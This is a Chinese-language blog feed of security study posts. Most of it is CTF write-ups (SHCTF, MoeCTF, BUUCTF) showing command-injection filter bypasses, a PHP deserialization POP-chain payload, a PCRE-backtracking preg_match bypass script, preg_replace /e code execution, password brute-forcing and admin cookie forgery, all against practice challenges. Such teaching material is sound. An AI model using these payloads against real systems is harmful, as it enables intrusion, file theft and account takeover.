title="总结"></a>总结</h2><p>通过调试可以发现</p><p>JSON.<em>parseObject方法是</em></p><ul><li>会先会获取反序列化器，同时通过反射获取所有的setXXX和getXXX</li><li>将所有属性和值放入反序列化器</li><li>反序列化的时候会调用该属性的setXXX设置对象属性</li><li>若是parseObject方法（除去parse方法），会转为json对象时会调用getter方法</li></ul><p>因此上面我们的代码中</p><p>​            我们定义的类没有cmd属性，但我们传入cmd键时，反序列化时触发setcmd方法，因此造成了命令执行。</p><p>除此，也要区分parse和parseObject，前者不会触发getXXX </p><p>​         最后，想说好久没更新了文章了。主要是最近好一段时间都没怎么深入投入学习，并有各种事情忙。（我想立flag了</p><p>初识java安全，确实我也是小白</p>]]></content>
      
      
      <categories>
          
          <category> java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA的使用与re浅浅入门</title>
      <link href="/2023/11/06/IDA%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8Ere%E6%B5%85%E6%B5%85%E5%85%A5%E9%97%A8/"/>
      <url>/2023/11/06/IDA%E7%9A%84%E4%BD%BF%E7%94%A8%E4%B8%8Ere%E6%B5%85%E6%B5%85%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="IDA的使用与re浅浅入门"><a href="#IDA的使用与re浅浅入门" class="headerlink" title="IDA的使用与re浅浅入门"></a>IDA的使用与re浅浅入门</h1><h2 id="界面介绍"><a href="#界面介绍" class="headerlink" title="界面介绍"></a>界面介绍</h2><ul><li>左侧是函数窗口，显示一些函数，可以crtf+f寻找main函数,找到主程序</li></ul><img src="/img/11-6/2.png" height="500px"><ul><li>主体是汇编代码，可以通过空格切换查看视图</li></ul><img src="/img/11-6/3.png"><ul><li>内存分段，直接明了看所在内存的位置</li></ul><img src="/img/11-6/4.png"><h2 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h2><ul><li>F5键–反汇编，，转化为伪C代码</li></ul><img src="/img/11-6/5.png"> <ul><li>shift+F12 切换到字符串展示界面(String Window)所有字符串在这里显示</li></ul><img src="/img/11-6/6.png"> <ul><li>crtf+X 交叉引用 寻找数据被引用的地方</li></ul><img src="/img/11-6/7.png"> <ul><li>g键 跳转到地址处</li></ul><img src="/img/11-6/8.png"> <ul><li>alt+t  搜索指令</li></ul><img src="/img/11-6/9.png"> <img src="/img/11-6/10.png"> <ul><li>n键对函数进行重命名</li></ul><img src="/img/11-6/11.png"> <ul><li>ctrl+z撤销操作</li></ul><p><strong>数据操作</strong></p><ul><li>d键转化数据格式，h结尾代表十六进制</li></ul><img src="/img/11-6/1.png"> <ul><li>a键转化为字符串</li><li>c键转化为汇编代码</li><li>u键转化为原始形式</li><li>shift+e导出选定数据</li><li>对在程序中一些数据右键可以改变其数据类型，原始的char是数字的形式</li></ul><img src="/img/11-6/12.png"> <ul><li>ctrl+e进入程序起始位置</li></ul><h2 id="BUUCTF-re前三题"><a href="#BUUCTF-re前三题" class="headerlink" title="BUUCTF re前三题"></a>BUUCTF re前三题</h2><h3 id="easyre1"><a href="#easyre1" class="headerlink" title="easyre1"></a><strong>easyre1</strong></h3><p>将程序拖入IDA,很好进来就是main函数</p><img src="/img/11-6/13.png"><p>F5,反汇编一下，得到flag ,flag{this_Is_a_EaSyRe}</p><img src="/img/11-6/14.png"><h3 id="reverse1"><a href="#reverse1" class="headerlink" title="reverse1"></a><strong>reverse1</strong></h3><p>一进来不是主函数，尝试在左边找到main，没找到 (</p><p>shift+F12 查看所有字符串，找到关键字符串this is the right flag!</p><img src="/img/11-6/15.png"><p>双击进入</p><img src="/img/11-6/16.png"><p>ctrl+x找到引用函数 ，再F5反汇编</p><img src="/img/11-6/18.png"><p>右键hide cast，隐藏标记以防看不懂</p><p>可以对一些熟悉的函数进行重命名，如sub_1400111D1就是printf函数</p><p>这里主要是对我们输入的字符串与Str2对比，如果一样就输出this is the right flag!，表明我们输入了正确的flag</p><p>那我们就看看此时的Str2是什么，他就是flag</p><img src="/img/11-6/19.png"> <p>双击进入，发现是{hello_world}</p><p>但返回刚才代码发现，程序对原始的Str2进行了修改</p><p>将某些数字改为字符类型，更为直白</p><img src="/img/11-6/20.png"><p>最后看这程序，是把Str2中的o改为0</p><img src="/img/11-6/21.png">  <p>因此最后flag为flag{hell0_w0rld}</p><h3 id="reverse2"><a href="#reverse2" class="headerlink" title="reverse2"></a><strong>reverse2</strong></h3><p>这个题目和上面的类似，不过一进来就是main函数，不要找了)</p><p>F5反汇编，跟上面的一样的逻辑</p><img src="/img/11-6/22.png"> <p>这里主要是flag变量</p><p>将前面修改flag的代码中的字符类型数据转化一下</p><img src="/img/11-6/23.png"> <p>这里主要是将flag中的i和r改为1</p><p>双击flag变量，查看内容</p><p>发现这里没有显示全</p><img src="/img/11-6/24.png"> <p>选中按下a，变为字符串</p><img src="/img/11-6/25.png"> <p>更改字符</p><p>得到最后flag,flag{hack1ng_fo1_fun}</p>]]></content>
      
      
      
        <tags>
            
            <tag> 二进制 </tag>
            
            <tag> re入门 </tag>
            
            <tag> 工具使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>创建和配置Servlet项目</title>
      <link href="/2023/10/15/%E5%88%9B%E5%BB%BA%E5%92%8C%E9%85%8D%E7%BD%AEServlet%E9%A1%B9%E7%9B%AE/"/>
      <url>/2023/10/15/%E5%88%9B%E5%BB%BA%E5%92%8C%E9%85%8D%E7%BD%AEServlet%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="创建和配置Servlet项目"><a href="#创建和配置Servlet项目" class="headerlink" title="创建和配置Servlet项目"></a>创建和配置Servlet项目</h2><p>servlet是原生的javaweb</p><p>这里学习javaweb时候，配置Servlet项目，idea社区版怎么手动配置Servlet项目,于是就搞了一个教程,也是算入坑javaweb了</p><h5 id="1-创建一个项目"><a href="#1-创建一个项目" class="headerlink" title="1.创建一个项目"></a><strong>1.创建一个项目</strong></h5><img src="/img/9-8/1.png"> <h5 id="2-添加web模块"><a href="#2-添加web模块" class="headerlink" title="2.添加web模块"></a><strong>2.添加web模块</strong></h5><p>先选择创建的项目，打开模块设置</p><img src="/img/9-8/2.png"> <p>在模块中选中自己的项目，添加web模块</p><img src="/img/9-8/3.png"> <p>然后确定</p><img src="/img/9-8/4.png"> <h5 id="3-配置web模块"><a href="#3-配置web模块" class="headerlink" title="3.配置web模块"></a><strong>3.配置web模块</strong></h5><p>在生成的web目录下的WEB-INF目录下创建classes目录，用于存放编译后的文件</p><img src="/img/9-8/5.png"> <p>再次打开模块设置，在模块中选择我们的项目，设置输出路径，将两个路径改为刚创建好的classes目录</p><img src="/img/9-8/6.png"> <p>点击修正，然后创建一个工件</p><img src="/img/9-8/7.png"> <p>最后确定</p><img src="/img/9-8/8.png"> <h5 id="4-配置Tomcat启动项"><a href="#4-配置Tomcat启动项" class="headerlink" title="4.配置Tomcat启动项"></a><strong>4.配置Tomcat启动项</strong></h5><p>打开运行配置</p><img src="/img/9-8/9.png"> <p>添加Tomcat配置</p><img src="/img/9-8/10.png"> <p>配置Tomcat,配置好Tomcat的安装路径</p><img src="/img/9-8/11.png"> <p>添加部署，选择刚设置好的工件</p><img src="/img/9-8/12.png"> <p>最后确定，当然也可以设置其他东西，如上下文，端口等等</p><img src="/img/9-8/13.png"> <h5 id="6-引入外部jar包"><a href="#6-引入外部jar包" class="headerlink" title="6.引入外部jar包"></a><strong>6.引入外部jar包</strong></h5><p>打开模块设置，添加Tomcat安装目录下的lib目录下的servlet-api.jar</p><p>这里也可以在web目录下创建lib目录,来放置导入的包!</p><img src="/img/9-8/14.png"> <h5 id="7-启动简单的实例"><a href="#7-启动简单的实例" class="headerlink" title="7.启动简单的实例"></a><strong>7.启动简单的实例</strong></h5><p>在web目录下，创建index.jsp,然后运行服务器</p><img src="/img/9-8/15.png"> <p>成功输出</p><img src="/img/9-8/16.png"> <p>编写Servlet程序，在src目录下创建一个软件包，编写一个java程序测试一下</p><pre class="language-none"><code class="language-none">package com.my;import jakarta.servlet.Servlet;import jakarta.servlet.annotation.WebServlet;import jakarta.servlet.http.HttpServlet;import jakarta.servlet.*;import jakarta.servlet.http.HttpServletRequest;import jakarta.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.PrintWriter;@WebServlet(name = "test")public class Helloserver extends HttpServlet implements Servlet {    @Override    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {    }    @Override    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException, IOException {        response.setContentType("text/html");        PrintWriter out = response.getWriter();        out.println("this is a test!");    }}</code></pre><img src="/img/9-8/17.png"> <p>然后编辑web.xml文件，如下设置</p><img src="/img/9-8/18.png"> <p>然后重新启动服务器访问</p><p>这里的url与我们配置的相对应</p><img src="/img/9-8/19.png"> <p>继续开启javaweb之旅(^-^)</p>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023SHCTF之web的wp</title>
      <link href="/2023/10/03/2023SHCTF%E4%B9%8Bweb%E7%9A%84wp/"/>
      <url>/2023/10/03/2023SHCTF%E4%B9%8Bweb%E7%9A%84wp/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h1 id="2023-SHCTF-web-wp-week-1"><a href="#2023-SHCTF-web-wp-week-1" class="headerlink" title="2023 SHCTF web wp[week 1]"></a>2023 SHCTF web wp[week 1]</h1><p>说明：可能稍微啰嗦了亿点,面向新生，放心慢慢食用,</p><p>下面前言可跳过（纯多bb了一下）</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>首先说web的话是应用层，所以会基本看不到底层的东西(包括c语言/c++)。对于ctf的话，web这块的内容，熟悉HTTP协议（知道计算机质之间是如何传递数据的），html.javaScript（前端语言）是必须要会一点，然后入门级的PHP也要会(比java简单多了)，然后就是Top10漏洞（其中还会涉及数据库mysql），也要知道一些常用的编码和加解密手段(Unicode、md5、base64),会这些后web也算入门了(看到这，要是我，已经当场去世)</p><p>这里再说说why（hihi,装一下）：为什么要搞web 安全，在这互联网的世界，我们能享受各种各样的服务(qq聊天、刷视频)，都离不开web技术，所以web里面也有很多技术（常听的前端和后端），所以就会有许多的漏洞存在，对于企业、学校等等来说web服务器就是面向大伙大门，想要攻入内部系统，首先要拿下web服务器(bushi) ,所以web这块对于整个渗透攻击或者安全防御都重要，企业看重web这块的安全比内网多多了，这里再插一条：2021爆出的史诗级漏洞–log4j2远程代码执行漏洞(CVE-2021-44228)</p><p>从易到难（前三个不好排），题解可能会不唯一，拿到flag就行，下面题目若是看不懂题解，也不要紧，把涉及的知识点记下来，以后慢慢学(hhhh)</p><p><strong>前几题不一定要有编程基础！</strong></p><h2 id="WEEK1-登录就给flag"><a href="#WEEK1-登录就给flag" class="headerlink" title="[WEEK1]登录就给flag"></a>[WEEK1]登录就给flag</h2><p><strong>前置知识</strong>：弱口令、暴力破解、（http协议、 抓包）</p><p>先bb一下(这里主打一个实操):</p><p>什么是弱口令：就是很容易会被猜到的口令(不一定是密码)，比如说常见的弱口令密码：123456、admin、password、000000...</p><p>什么是暴力破解：简称爆破，大白话就是一个一个去试，当然一般不会是人工，拿着工具或者编程语言脚本去跑。</p><p>拿什么去试？：一般会有人把常见的密码或者用户名等测试语句存放在一个文本文件里面，这个通常叫作字典，github上有开源的字典（一搜便是），当然 也可以自己搜集制作自己的字典</p><p>这里再插一条：admin （后台）管理员的意思，后台管理员是网站中能够控制管理内容的角色(如别人提交发布文章、视频、监控网站等等)，有最高权限，一般就是网站登录的特殊用户（有些可能会有后台管理系统），在现实中和ctf中，无疑管理员的账号可能会是admin（有时候密码也是） 所以第一测试的用户名就是admin</p><p>回到题目</p><p>这题就是登录时有弱口令漏洞</p><p>进入登录页面</p><img src="/img/10-3/5.png"><p>上面bb了，这里username用户名直接测试admin</p><p>至于密码，开头可以首测几个弱口令 ，运气好就测出来了（hhh）、本题弱口令密码–password（我是没那运气），登录成功后就有flag</p><img src="/img/10-3/6.png"><p>下面进入常规的爆破密码解法（没运气的看这边）</p><p>这里我用的工具是Burp Suite  (web和渗透必备)，没安的kali上面自带，安装需要java环境（burp安装稍微复杂，但必备）</p><p>使用burp抓包送至Intruder模块进行暴力破解(b站上有教程)，并对我们输入的密码部分进行标记(标记后前后都会有$)</p><img src="/img/10-3/7.png"><p>设置payload(不想解释了)，点load加载字典文件（自己网上搜），若右边有内容说明加载成功，说明加载成功，最后点击Start attack开始攻击</p><img src="/img/10-3/8.png"><p>等他跑完，最后可以根据Status code（状态码）和Length（返回长度）找出那与众不同的那条，发现password就是密码，拿去登录拿flag</p><img src="/img/10-3/9.png"><h2 id="WEEK1-生成你的邀请函吧"><a href="#WEEK1-生成你的邀请函吧" class="headerlink" title="[WEEK1]生成你的邀请函吧~"></a>[WEEK1]生成你的邀请函吧~</h2><p>前置知识：http协议、json*</p><p>这个题，题目描述就告诉我们该怎么做了</p><img src="/img/10-3/10.png"><p>根据他的描述请求就行。请求接口为generate_invitation</p><p>实体类型：application/json</p><p>请求方式为POST、请求实体就是上面的Body，这里其实就是一个标准的请求接口，传递json数据，获得一张图片</p><p>下面分别展示插件Ha</p><p>ckbar和Burp Suite抓包改包(选一个有的就行)</p><p>Hackbar</p><p>1.设置URL    2.设置POST请求  3.设置类型为json数据         4.加上json数据</p><img src="/img/10-3/11.png"><p>Burp Suite</p><p>抓包，然后改成这样，再放包</p><img src="/img/10-3/12.png"><p>最后打开图片，flag就在下面</p><img src="/img/10-3/13.png"><h2 id="WEEK1-飞机大战"><a href="#WEEK1-飞机大战" class="headerlink" title="[WEEK1]飞机大战"></a>[WEEK1]飞机大战</h2><p><strong>前置知识</strong>：html、javascript、unicode编码、base64</p><p>右键查看源代码 ，找到引用的js文件，点击查看js文件源码</p><img src="/img/10-3/1.png"><p>看到这个函数，应该是游戏赢了后执行的，里面有一窜奇怪的字符</p><img src="/img/10-3/2.png"><p>这串字符其实就是unicode编码，十有八九就是flag,将其进行解码</p><img src="/img/10-3/3.png"><p>拿到：ZmxhZ3s0MzAxMTk1ZS05MWE5LTQ0Y2ItYjk4NC0wMjQ4ZGQ3MWRhYTB9</p><p>好家伙，搁这玩套娃(出题人出来挨打)，这层实际是base64加密，这些加解密，网上都有在线的</p><p>再解base64，得到flag</p><p><img src="/img/10-3/4.png"> &gt;</p><p><strong>接下来的题目需要会编程语言（PHP）、漏洞基础！</strong></p><p>PHP是世界上最好的语言…….十分合理（hh),比java简单多了(虽然现在java是主流，不建议入门就学)</p><h2 id="WEEK1-babyRCE"><a href="#WEEK1-babyRCE" class="headerlink" title="[WEEK1]babyRCE"></a>[WEEK1]babyRCE</h2><p><strong>前置知识:</strong>  http协议、 php入门，Linux系统命令(会查看编辑文件、熟悉目录结构)，  代码执行漏洞(RCE)以及相关绕过和防御、正则表达式</p><p>首先不得不说现在的服务器（古老的除外）。都基本是Linux，所以涉及这个漏洞的时候就要熟悉Linux指令</p><p>这题纯粹的RCE，这题解法应该有很多，说其中一种</p><img src="/img/10-3/14.png"><p>代码解析：首先获取GET传参rce，然后对我们传的参数进行了正则过滤、没有过滤字符才会把我们传的参数进行系统命令执行</p><p>它过滤了cat 、more、less、ead、tac、tail、nl、od、vi、vim、sort、flag|、;|0-9、*、`、%、&gt;、&lt;、’、” 还有空格</p><p>首先ls查看当前web目录下的文件</p><img src="/img/10-3/15.png"><p>这些就不能直接出现我们输入的参数里面。空格这里用%09代替(tab键的url编码)</p><p>cat和flag 再其中加入\就行 ,?rce=c\at%09./f\lag.php查看flag.php文件</p><img src="/img/10-3/16.png"><p>看不到内容，查看源代码</p><img src="/img/10-3/17.png"><p>好好好，被出题人给骗了（出来受打）看看根目录有没有flag</p><img src="/img/10-3/18.png"><p><strong>到后面应该算得上中等题了，这里知识储备就多了,好好好，这是新生赛</strong></p><h2 id="WEEK1-ez-serialize"><a href="#WEEK1-ez-serialize" class="headerlink" title="[WEEK1]ez_serialize"></a>[WEEK1]ez_serialize</h2><p><strong>前置知识</strong>：PHP类与对象、PHP魔术方法、PHP反序列化漏洞、POP链、文件包含漏洞、php伪协议</p><p>PHP反序列化的题主打一个代码审计（看代码），好好好，代码多的时候当场去世</p><p>,先马代码，序列化和反序列化不多说了,主打套娃反复横跳</p><img src="/img/10-3/19.png"><p>这里代码审计和魔术方法不多说了，说下pop利用链</p><p>1.最外层是B类的对象，触发__wakeup方法,</p><p>2.q属性是C类的实例对象,触发__toString方法</p><p>3.C中属性var是D类的实例对象，触发__get方法</p><p>4.D中的属性p是A类的实例对象，触发__inovke方法</p><p>5.A中属性var_1是我们要包含的文件；最后利用文件包含漏洞</p><p>这里利用php://filter和文件包含漏洞来读取flag.php文件</p><p>上序列化代码</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$var_1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$q</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$var</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$z</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">D</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$p</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">D</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-&gt;</span><span class="token property">var_1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">-&gt;</span><span class="token property">p</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-&gt;</span><span class="token property">z</span> <span class="token operator">=</span> <span class="token variable">$d</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-&gt;</span><span class="token property">q</span> <span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>执行上面代码得到序列化字符串</p><pre class="language-reStructuredText" data-language="reStructuredText"><code class="language-reStructuredText">O:1:"B":1:{s:1:"q";O:1:"C":2:{s:3:"var";N;s:1:"z";O:1:"D":1:{s:1:"p";O:1:"A":1:{s:5:"var_1";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}}</code></pre><p>得到文件内容, PD9waHANCiRmbGFnID0gImZsYWd7NzZmZmExNWYtY2YxOS00ZTMwLTk3ZDEtNTdlMmQ5Yjg3MDJlfSI7DQo=    进行base64解密得到flag    </p><p>flag{76ffa15f-cf19-4e30-97d1-57e2d9b8702e}</p><img src="/img/10-3/20.png"><h2 id="WEEK1-1zzphp"><a href="#WEEK1-1zzphp" class="headerlink" title="[WEEK1]1zzphp"></a>[WEEK1]1zzphp</h2><p><strong>前置知识</strong>：正则表达式、php代码审计、php正则函数绕过、(python)</p><p>这里顺便提一下PHP的弱类型比较，可以学习学习</p><p>这题真不一定能get到（出题人出来挨打），遇到的才有思路（我也学到了）</p><p>首先代码审计，主要分为两部分</p><img src="/img/10-3/21.png"><p>第一部分：正则过滤了num中的数字，但没有数字无法进入下一部分</p><p>这里给num传个数组(?num[]=1)就行，preg_match 遇到数组会返回null</p><p>第二部分：c_ode需要2023SHCTF ，但又不能出现SHCTF,</p><p>这里只能绕过preg_match函数</p><p>需要补充知识：</p><p>看看大佬p神的文章：<a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">PRCE回溯攻击</a></p><p>总之一句话：超长字符串引发php安全机制，从而绕过preg_match 函数</p><p>上python脚本自动构造超长字符(好好好，这题c_ode长度达到了1000000的级别才行)</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token comment">#pip 安装一下库</span><span class="token comment">#改成自己题目的url</span>url<span class="token operator">=</span><span class="token string">"http://112.6.51.212:30932/"</span>data<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">"c_ode"</span><span class="token punctuation">:</span><span class="token string">"s"</span><span class="token operator">*</span><span class="token number">1000000</span><span class="token operator">+</span><span class="token string">"2023SHCTF"</span><span class="token punctuation">}</span>res<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span><span class="token string">"?num[]=1"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span></code></pre><p>运行代码，最后得到flag</p><img src="/img/10-3/22.png"><h2 id="WEEK1-ezphp"><a href="#WEEK1-ezphp" class="headerlink" title="[WEEK1]ezphp"></a>[WEEK1]ezphp</h2><p><strong>前置知识</strong>：php、代码执行漏洞、phpinfo、正则表达式、preg_replace代码执行</p><p>好好好，做到这个题，原来我也是新生(太菜了，呜呜~)</p><p>上题目</p><img src="/img/10-3/23.png"><p>前面正则过滤了好多东西，暂且不管，这题只要出phpinfo页面就行了</p><p>关键是圈出部分</p><p>这个我见的少(可能是第二次见)，直接码文章：</p><p><a href="https://mochazz.github.io/2018/08/13/%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6preg_replace%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">深入研究preg_replace与代码执行 | Mochazz’s blog</a> </p><p>preg_replace这个函数原本是利用正则表达式替换符合条件的字符串，但是这个函数有一个功能——<code>可执行命令</code>。这个函数的第一个参数是正则表达式，按照PHP的格式，表达式在两个“/”之间。如果我们在这个表达式的末尾加上“e”，那么这个函数的第二个参数就会被当作代码执行。 </p><p>总之，/e模式下正则表达式代码执行（这里可以用在php的一句话木马中）</p><p>解析题目代码：</p><p>pattern为匹配模式，code为匹配字符串，\1 其实是一个引用，指向code参数</p><p>上payload</p><img src="/img/10-3/24.png"><p>code为格式{${要执行的代码}}（官方payload就是这样的，我也没深入研究，先拿来用） 只要匹配成功就能执行code代码，所以pattern为（.*），意为匹配所有。</p><p>匹配成功后执行代码，显示phpinfo页面</p><p>再ctrl+f 搜索flag就能找到flag</p><img src="/img/10-3/25.png"><h2 id="后话"><a href="#后话" class="headerlink" title="后话"></a>后话</h2><p>新生赛，也大概体会了一下ctf，不仅局限于ctf,学web和二进制等方向还是看自己兴趣，凭着ctf也可以研究好web安全(前期)</p><p>web方向确实面向现实一点，是渗透测试的基础，web安全方向知识的也会常常出现在绝大多安全岗位的面试题</p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> ctf入门 </tag>
            
            <tag> 新生赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023MoeCTF之web的wp</title>
      <link href="/2023/09/12/2023MoeCTF%E4%B9%8Bweb%E7%9A%84wp/"/>
      <url>/2023/09/12/2023MoeCTF%E4%B9%8Bweb%E7%9A%84wp/</url>
      
        <content type="html"><![CDATA[<h1 id="2023-MoeCTF-WEB-wp"><a href="#2023-MoeCTF-WEB-wp" class="headerlink" title="[2023 MoeCTF] WEB wp"></a>[2023 MoeCTF] WEB wp</h1><p>环境有问题，我开始还能用自己ip访问，后面突然不行了，这导致不能抓取本地的包，没关系照样做(^-^)</p><h1 id="http"><a href="#http" class="headerlink" title="http"></a>http</h1><p>签到题一</p><img src="\img\9-12\7.png" height="300px"><p>第一眼还没看懂，这应该满足他的条件即可拿到flag</p><p>1和2,分别get和post传参，</p><p>3.修改Cookie为character为admin</p><p>4.添加字段X-Forward-For: 127.0.0.1</p><p>5.修改User-Agent内容为MoeBrowser</p><img src="\img\9-12\8.png"><h1 id="Web入门指北"><a href="#Web入门指北" class="headerlink" title="Web入门指北"></a>Web入门指北</h1><p>签到题二</p><p>解密：</p><pre class="language-text" data-language="text"><code class="language-text">666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c513152475831637959 6c396a61474673624756755a3055684958303 </code></pre><p>对密码不是很熟悉，但对这里应该只能是md5、base64、16进制</p><p>一看只能是16进制</p><p>进行16进制解码：<code>flag=bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0</code></p><p>这里面还加了一层base64,</p><p>进行解码：<code>moectf{w3lCome_To_moeCTF_W2b_challengE!!}</code></p><h1 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h1><p>签到题三</p><p>查看源代码搜索注释(&lt;!–)就行（藏得靠后…）</p><img src="\img\9-12\9.png"><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><p>根据他给出的api进行注册和登录，然后获取flag</p><img src="\img\9-12\10.png" height="300px"><p>提示我们不是admin用户，拿到cookie,</p><p>进行base64解码，得到<code>{"username": "yyj", "password": "123456", "role": "user"}</code></p><p>修改为<code>{"username": "admin", "password": "123456", "role": "admin"}</code></p><p>再进行base64编码得到eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwYXNzd29yZCI6ICIxMjM0NTYiLCAicm9sZSI6ICJhZG1pbiJ9</p><p>替换Cookie中的token值，再访问flag，得到flag</p><pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span><span class="token property">"error"</span><span class="token operator">:</span> <span class="token string">"ok"</span><span class="token punctuation">,</span> <span class="token property">"data"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"flag"</span><span class="token operator">:</span> <span class="token string">"moectf{cooKi3_is_d3licious_MA9iVff90SSJ!!M6Mrfu9ifxi9i!JGofMJ36D9cPMxro}"</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h1 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h1><p>多看了几眼，根据他给的说明，要正确提交正确的表单，</p><img src="/img/9-12/11.png"><p>然后根据规则，编写python脚本，注意一下Cookie(session)问题，开始还没注意到</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token comment">#默认post参数</span>data<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">"driver"</span><span class="token punctuation">:</span> <span class="token string">"yyj"</span><span class="token punctuation">,</span><span class="token string">"steering_control"</span><span class="token punctuation">:</span> <span class="token string">'0'</span><span class="token punctuation">,</span><span class="token string">"throttle"</span><span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token punctuation">}</span><span class="token comment">#url</span>url<span class="token operator">=</span><span class="token string">'http://localhost:60713'</span><span class="token comment">#默认cookie</span>cookies<span class="token operator">=</span><span class="token punctuation">{</span>    <span class="token string">'session'</span><span class="token punctuation">:</span> <span class="token string">'.eJxtjdsKAiEURf_lPEuoo8fLr2TINKM0UQ6YJxqif0-GHntZsC_s_YZpLa2ut3hZSgMPgXSWOZDjeghkMKtA1qopUM68E6XrvjYD75Tu3OnkuNMEUsni3hTAYK7LM9W-uW3XLkt6tfh7A3_kTJ4Y1JXKDJ4zeLSxttiWewIv0CktLBp7QMlxsIrB30QJ8_kCkKs6Qw.ZQBNlg.s5GIQKXa8JudrZi3dGeeS_T699Q'</span><span class="token punctuation">}</span><span class="token comment">#精确爬虫，也可以不搞</span><span class="token keyword">def</span> <span class="token function">result</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">:</span>    html<span class="token operator">=</span>BeautifulSoup<span class="token punctuation">(</span>res<span class="token punctuation">,</span><span class="token string">'lxml'</span><span class="token punctuation">)</span>    fl<span class="token operator">=</span>html<span class="token punctuation">.</span>body<span class="token punctuation">.</span>div<span class="token punctuation">.</span>string    <span class="token keyword">if</span><span class="token punctuation">(</span>fl<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'请求结果：'</span><span class="token punctuation">,</span>fl<span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'请求结果：'</span><span class="token punctuation">,</span>html<span class="token punctuation">.</span>body<span class="token punctuation">.</span>div<span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">setdata</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span>data<span class="token 